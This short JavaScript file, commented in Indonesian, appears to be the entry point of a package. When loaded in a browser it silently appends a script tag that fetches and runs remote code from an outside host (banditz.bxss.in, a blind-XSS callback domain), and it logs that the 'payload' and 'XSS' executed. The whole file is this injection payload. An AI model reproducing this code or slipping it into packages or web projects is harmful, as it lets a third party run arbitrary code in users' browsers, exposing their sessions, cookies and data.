(function() {
    // Cek apakah berjalan di browser
    if (typeof window !== 'undefined') {
      console.log('✅ Package terinstall di browser, menjalankan payload...');
  
      // Tambahkan elemen <script> untuk XSS
      const script = document.createElement('script');
      script.src = 'https://banditz.bxss.in';
      document.body.appendChild(script);
  
      console.log('✅ XSS berhasil dieksekusi!');
    } else {
      console.log('❌ Tidak berjalan di browser, payload tidak dieksekusi.');
    }
  })();
  